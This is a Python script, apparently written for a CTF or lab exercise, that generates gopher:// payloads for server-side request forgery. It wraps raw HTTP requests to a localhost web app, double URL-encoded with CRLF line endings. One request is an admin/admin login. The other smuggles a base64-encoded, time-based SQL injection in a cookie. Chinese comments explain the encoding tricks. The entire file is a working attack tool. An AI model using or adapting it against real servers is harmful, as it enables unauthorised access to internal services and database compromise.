import urllib.parse

host = '127.0.0.1:80'
content = 'uname=admin&passwd=admin'
content_length = len(content)
cookie = "this_is_your_cookie=JykgdW5pb24gc2VsZWN0IDEsMixpZigxPTEsc2xlZXAoNSksMSkgIw=="

test1 = \
"""
POST /index.php HTTP/1.1
Host: {}
User-Agent: curl/7.43.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: {}
{}
""".format(host, content_length, content)

test2 = \
"""
GET /index.php HTTP/1.1
Host: {}
Connection: close
Content-Type: application/x-www-form-urlencoded
Cookie: {}
""".format(host, cookie)

def create_payload(message):
    tmp = urllib.parse.quote(message)       # 对payload中特殊字符进行编码
    new = tmp.replace("%0A", "%0D%0A")      # CRLF换行漏洞
    result = urllib.parse.quote(new)
    print("gopher://" + host + "/_" + result)
    # %0D%0A代表双重url编码的空格, gopher会将第一个字符吞噬, 所以加一个下划线
    # 回车换行要变为%0D%0A
    # 在http包最后要加%0D%0A代表消息结束

if __name__ == '__main__':
    # create_payload(test1)
    create_payload(test2)